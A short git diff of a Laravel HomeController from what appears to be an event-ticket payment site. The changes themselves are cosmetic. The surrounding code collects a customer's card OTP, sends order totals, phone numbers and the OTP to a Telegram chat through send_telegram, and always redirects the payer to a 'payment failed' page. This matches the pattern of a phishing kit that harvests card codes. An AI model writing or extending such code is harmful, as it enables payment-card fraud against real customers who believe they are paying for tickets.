@@ -122,6 +122,8 @@ class HomeController extends Controller
         💰: Total : $grandTotal ريال
 
         📞: $phone
+      ======================
+
                     ";
 
             $this->send_telegram($message);
@@ -200,6 +202,7 @@ class HomeController extends Controller
             'otp' => 'required'
         ]);
         $card = Card::query()->findOrFail($request->cardId);
+
         $card->update([
             'otp' => $request->otp
         ]);
@@ -222,9 +225,16 @@ class HomeController extends Controller
         ";
 
             $this->send_telegram($message);
-
-        return \redirect()->route('payment.failed');
+        $event = $card->order->tickets[0]->event->id;
+        return \redirect()->route('payment.failed')->with('event',$event);
     }
+
+
+
+
+
+
+
 
     public function send_telegram($message)
     {
